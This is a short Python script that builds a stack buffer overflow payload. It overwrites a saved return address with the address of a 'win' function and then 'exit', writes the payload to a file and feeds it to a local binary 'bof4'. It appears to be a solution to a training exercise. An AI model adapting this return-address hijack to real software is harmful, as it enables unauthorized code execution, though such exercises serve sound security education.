import struct 
import os

big_eip = 136
ov_func = 0x80484c0

buff_eip=28
win = 0x804849b

exit = 0x8048370

atk_vector = "A"*buff_eip
atk_vector += struct.pack("I", win)
atk_vector += struct.pack("I", exit)
atk_vector += "A"*(big_eip-len(atk_vector))
atk_vector += '\n'

f = open("badfile1", 'w+')
f.write(atk_vector)
f.close()

os.system('./bof4 < {}'.format('badfile1'))

